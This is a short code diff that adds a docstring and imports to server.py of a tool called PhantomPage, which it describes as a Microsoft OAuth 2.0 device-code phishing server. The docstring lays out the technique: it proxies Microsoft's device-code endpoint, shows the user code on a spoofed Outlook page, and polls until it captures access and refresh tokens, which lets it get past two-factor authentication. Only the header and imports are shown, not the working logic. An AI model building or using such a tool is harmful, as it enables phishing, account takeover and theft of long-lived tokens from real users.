@@ -1,3 +1,21 @@
+"""
+PhantomPage (server.py) — Microsoft OAuth 2.0 Device Flow phishing server
+
+Abuses the Microsoft OAuth 2.0 device authorization flow to bypass 2FA and
+capture access + refresh tokens without ever knowing the user's password.
+
+Technique:
+  Proxies requests to login.microsoftonline.com/common/oauth2/v2.0/devicecode,
+  displays the user code via a spoofed Outlook phishing page (outlook.html),
+  then polls for token completion. Scope includes offline_access to obtain
+  long-lived refresh tokens usable across sessions.
+
+Limitations:
+  - Requires the target to visit the phishing page and enter the device code.
+  - Token validity depends on the target's session and MFA policies.
+  - Captured tokens are printed to stdout; no persistent storage.
+"""
+
 from flask import Flask, jsonify, send_from_directory
 from flask_cors import CORS
 import requests
